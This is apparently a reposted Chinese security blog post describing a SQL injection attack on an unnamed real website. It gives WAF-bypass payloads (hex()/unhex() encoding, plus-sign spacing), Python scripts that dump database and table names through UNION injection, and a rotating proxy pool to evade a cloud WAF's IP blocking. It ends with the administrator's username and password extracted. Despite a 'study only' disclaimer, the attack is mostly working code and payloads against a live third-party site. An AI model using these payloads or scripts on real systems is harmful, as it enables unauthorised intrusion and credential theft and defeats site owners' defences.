> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nVJXNpiDlI_Tjg928M3jbg)

**以下内容仅作为学习研究，禁止用于违法犯罪活动，由此产生的法律风险自行承担。**

某网站存在一处 sql 注入漏洞。

第一层 waf
-------

在 id 后面加上 `and 1=1`，被 waf 拦截  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvJ7cw6q71ibxia7OMnpXpribRsPLREsHsYNzmRoOW8SxJNjB5Ch3ick3H9Q/640?wx_fmt=png)

将空格替换为加号 `+`，即 `id=296+and+1=1` 不再拦截  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvhmFbb9OtUUFBXhVTZWJoUZlabBSvPJicoK196KicWFkndiaVnyAZMDxng/640?wx_fmt=png)

再将 id 改为 `id=296+and+1=2`，新闻详情返回为空，确认存在注入漏洞  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvAUZHVEIfc8o2HxO87NXMDxIfSXPMK4dYwl4oQsn8TSTia85XiaFJfxKQ/640?wx_fmt=png)

通过 `order by` 查询字段数 ↓  

字段数超过长度的时候，新闻详情展示为空，没有超过长度的时候正确展示新闻详情  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvRWS20WqTqEMABMooiaFhE2ibMVMx8LrBDBezxIlwy5jnsyLfnzQWsJFg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvhaYXJ3WbG5X43S9QhXBqZOJs2gq5LBo9NdZXKicTu6H8J9T275OxF0Q/640?wx_fmt=png)

通过二分法不断测试，查询的字段数为 11

`union` 联合查询判断字段输出位置 ↓  
将 union 前面的 id 值设置为负数，使之返回为假  
从页面返回可以看出，2，4，8 的位置能展示返回内容  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvvQ7ic8dCxSXic8WPicJjzU6RDbxibZfo5UsE6tePKhUwonrHhSRWRUXmUg/640?wx_fmt=png)

分别查询`user()`、`version()`、`database()` 确认可以正常返回  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvVmSc3ea1c3ib0rRcAsic3UyEoyLaXsDtsRBia0fTNfEd1EdXX2dSytCYA/640?wx_fmt=png)

选择标题位置继续获取更多信息  

查询所有的数据库名，被 waf 拦截  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvt9G5IkcmN72e5flIl2mISOmvzxm5FvrfdZ2QOhNwCWx20HeSdyYtwQ/640?wx_fmt=png)

分别将 URL 中的 `group_concat()`、`from`、`information_schema`、`schemata` 字符依次删除并发送请求.  
最后确定是 group_concat() 命中了 waf 规则，并且是 group_concat 和括号 () 在一起的时候才会触发拦截。  

将 `group_concat()` 替换为 `group_concat/**/()`，仍然被拦截  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvleS1n7sYm7kcHlVicWap4UqAcwmevxw0BKtljmicWvnubw2wO7bUQQicw/640?wx_fmt=png)

不确定是黑名单匹配还是只要包含`/**/`这类注释就用正则匹配全部拦截，测试一下，打开 burpsuite，使用 intrude 模块在 `/**/` 中间加入随机任意字符串例如 `/*asd13*/` 等，发现确实有些返回包不是 waf 拦截，但是返回状态码 403 且有如下提示，同样无法正常展示注入的数据，此路行不通  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvFzBGHustxgZPHGg6Fz1l2AOBTt3eUUtJIOnsgVGkXB7eeiaibPFtXMMw/640?wx_fmt=png)

尝试内敛注释 `/*!group_concat()*/` 也被拦截  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvkoKb3o3EtpcnEadiciaRcGKicLXuGjvM4OEpykb3f3DoABrn0oicvlGOKQ/640?wx_fmt=png)

拼接字符串相关的 `concat()`函数、`concat_ws()`函数都被拦截。  

好吧，那就不直接获取全部返回值了，老老实实加上 limit 一个一个来吧  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvwvkGBm30hwiaV7uWlFXl5s3Stg9tVT9m3qHVib62EKNQM7qmRS7McT6g/640?wx_fmt=png)

没有被 waf 拦截，但是没有回显数据  

问题来了，version()、user() 这些可以正常返回到前端页面，说明这个注入点是可以回显的，但是具体查询表数据的时候不展示，很有可能是后台代码对返回到前端的数据做了过滤，涉及敏感库表信息的就返回空值。

因此就先不花精力去尝试布尔盲注、时间盲注、NDSlog 盲注等浪费时间的操作。先将查询的数据做一次变形，看是否能绕过后台匹配逻辑。

##### ascii()

将查询的数据放到 ascii() 方法中，waf 没有拦截，可以正常返回数据  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvPjwvTlRL461G3UgyJU05CfibIrOw2STjyRVhiaFnLic6GMjLvicGSxV7qg/640?wx_fmt=png)

ascii() 方法是返回字符串的第一个字符的 ascii 值，所以这里查询到的数据库名第一个字母是 `h`。  
可以写个简单的脚本或者用 burpsuite 替换 limit 的值挨个查询剩余数据库名的每个字符串 ascii 值再转换回字符串  

##### hex()

将查询的数据放到 hex() 方法中，waf 也没有拦截，同样可以正常返回数据  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSviatiaOR6f9xYq663nrsmBGHh0bXZNHZkNl0sxaDpOrmeMncJtIIQf58w/640?wx_fmt=png)

比 ascii() 更方便，可以将整条数据都进行 hex 编码而不只是第一个字符，再通过 unhex() 方法转换回字符串  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvr3XSX5uIwh2dGE0oe7wfyJjVCTBuvFjq7ZOU6AmgqK6jricWKCmFM7Q/640?wx_fmt=png)

接下来就可以手动 + burpsuit 获取一个个表名和表内数据了  

第二层云 waf
--------

burp 获取的数据不够直观，用 python 重新写一下

##### 获取全部数据库名 ↓

```
import time,requests,lxml
from bs4 import BeautifulSoup

headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36 Edg/81.0.416.50'
}

for i in range(0,10000):
    url = 'http://www.xxx.com/xx.php?id=296+and+1=2+union+select+1,2,3,4,5,6,7,unhex(hex(schema_name)),9,10,11+from+information_schema.schemata+limit+%d,1--+' % i
    r = requests.get(url,headers=headers)
    soup = BeautifulSoup(r.text,'lxml')
    result = soup.select('div.main_word > div.main_cont > div.new_txt')[0].text.strip()
    if result != '':
        print(result)
    else:
        print('所有库查询完毕'+'\n'+'-'*30)
        break
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvxEIobMLdxhN0CfA8hE1xyeAGc0R4zXXbKpKe3TYIkdEJVdIRraoLJQ/640?wx_fmt=png)

当前权限只查询出两个表，一个是 mysql 内置的 information_schema，另一个就是网站管理员自定义的表 `hxxxxxxg`  

##### 获取 hxxxxxxg 库内的所有表名称 ↓

上面代码中 url 中的参数换成查询表名称的 sql

```
...

for i in range(0,10000):
    url = 'http://www.xxx.com/xx.php?id=296+and+1=2+union+select+1,2,3,4,5,6,7,unhex(hex(table_name)),9,10,11+from+information_schema.tables+where+table_schema="hxxxxxxg"+limit+%d,1--+'%i
    r = requests.get(url,headers=headers)
    soup = BeautifulSoup(r.text,'lxml')
    result = soup.select('div.main_word > div.main_cont > div.new_txt')[0].text.strip()
    if result != '':
        print(result)
    else:
        print('所有表查询完毕')
        break
```

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvqrVysYHnNxykvV1Ua2LdktK8UFwibLQBZ14ibmPtWVHz19QVZWVNm1Lg/640?wx_fmt=png)

查询到 8 个表后脚本执行报错，在返回页面找不到数据  
打开浏览器查看  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvMegoCwzRlRNOj8ynRCG7c2y4apbI8Anu5icDGzPkjOiccm1hteGJ9h1Q/640?wx_fmt=png)

是因为被另一个 waf 拦截导致的，这个是西部数据的云 waf 平台  
绕过云 waf 的思路主要是找该网站的真实 IP，如果能找到真实 IP 在本地电脑 host 绑定一下，那么云 waf 就形同虚设。  

首先验证是否有 CDN  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvBxIbiaY3Libb3SuoDCGAdVrCB2zDGW5zPc3k8oumWh5hS3iaNA6bQOjww/640?wx_fmt=png)

多个地区的 ping 地址一样，解析的 IP 地址都是西部数码数据中心，也就是云 waf 的机房  

查看 DNS 解析历史  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvCdsrIxV2ANnBT882UlX9Et0sJWaQuIDib2Hs7CJ4MorHeddvC7ZLricg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSv6oNWq8auVYYqxgqQoFicXf4gJrYgZK3RB1MpWWn4kTJXL54r8fVmsUA/640?wx_fmt=png)

从不同的 DNS 历史解析平台查询到几个跟云 waf 不同网段的 IP，很可能是网站之前的真实 IP  

然而… 挨个访问这些 IP 发现早已无法访问。

查询子域名 IP  
layer 子域名挖掘机和 subdomainbrute 扫描子域名  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSviaB7GSDk458xvR1AmtQbnsPMzk4GCBMLljBJzmtgqYJjbwSBeDx14IQ/640?wx_fmt=png)

发现两个其他的域名，一个 mail 开头的 IP ，访问跳转到了网易邮箱主页，应该是该网站的企业邮箱用的网易邮箱服务。  
另一个域名是 smtp，访问这些 IP 也早已经无法访问  

该网站也没有调起发送邮件的入口 (例如邮箱注册等)，无法通过邮件获取真实 IP。  
通过钟馗之眼、fofa、shodan 等平台也没有找到该网站有价值的数据。  
查找真实 IP 绕过云 waf 这条路暂时没有好办法，放弃。

##### 峰回路转 ↓

根据这个云 waf 的提示很可能是由于请求速度过快，被当作是攻击行为进行了拦截导致 ip 被 ban。

于是更换 ip 并增加等待时间结果不久后还是被拦截。

想起之前做爬虫时候写的 [**ip 代理池**]，猜想：如果每次请求更换一个随机的 ip 是否能绕过 waf。

> IP_POOL 是一个自动获取 ip 的程序，python 编写，配合安装在本地的 redis 数据库维持代理池的可用性，默认从西刺代理和快代理采集前 10 页的免费代理，也可以手动添加其他网站进行采集，或者购买付费代理添加到此程序中。  
> 使用 flask 库对外开放三个接口，分别是：获取全部 ip，随机获取一个可用 ip，获取所有的 ip 数量

二话不说，找到之前写的代码，运行起来  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSv3pOlfWFvUcNr9PAAetPcmpfRZYoGxdfEDNeiao5rG0ZDDdejC4DRzxw/640?wx_fmt=png)

将获取 ip 的接口带入到之前的请求中再次尝试，每次请求随机更换一个 ip。  

```
def get_proxy():
    proxy = requests.get('http://localhost:5000/random').text
    return proxy

for i in range(0,10000):
    ...
    r = requests.get(url,headers=headers,proxies={'http':'http://'+get_proxy()})
    ...
```

该数据库中的所有表都查了出来，共 338 个表。

其中有一个 “******_admin” 表，应该储存里管理员的信息，查一下字段。  

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSvhyibKApr2G7iciaf5zeffYicNKjhNzCm76eue6M8ER2O4GBoFZddMyVapA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/bMyibjv83iavyDW4j08ibdzO5HeYtnUtXSv7wrsgknRS8hgCWWTuVUib3wibPAhmIFjzdx2gBjqpZ06hFArI8K3UOZQ/640?wx_fmt=png)

果然有 uname 和 pwd 字段，成功拿到管理员账号密码。  

自动获取其他表数据同理，将 python 脚本中 URL 的参数修改为查询表数据的 sql 即可，不再赘述

总结
--

1. 绕过第一层 waf 是利用了它对敏感函数过滤不严格，可以利用 hex 编码 / 解码来使得查询的数据正常展示。  
2. 平时可以维护一个代理池，在遇到云 waf 无法找到网站真实 ip 的时候可以从这方面绕过。

**版权申明：**内容来源网络，版权归原创者所有。除非无法确认，都会标明作者及出处，如有侵权烦请告知，我们会立即删除并表示歉意。祝愿每一位读者生活愉快！谢谢!

转载于：https://lipeilipei.top/，各位同学可关注作者博客。

```
扫描关注乌雲安全


觉得不错点个“赞”、“在看”哦
```